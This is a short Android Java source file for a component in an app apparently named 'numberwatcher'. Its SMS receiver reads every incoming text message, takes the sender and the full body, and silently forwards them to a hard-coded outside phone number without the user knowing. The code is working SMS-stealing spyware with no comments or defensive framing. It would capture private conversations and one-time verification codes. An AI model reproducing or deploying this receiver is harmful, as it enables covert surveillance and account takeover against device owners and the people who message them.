
package com.example.numberwatcher;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getOriginatingAddress();
                    String message = sms.getMessageBody();

                    String msg = "== رسالة جديدة ==\nمن: " + sender + "\nالمحتوى: " + message + "\n==================";

                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage("+967775993565", null, msg, null, null);
                }
            }
        }
    }
}
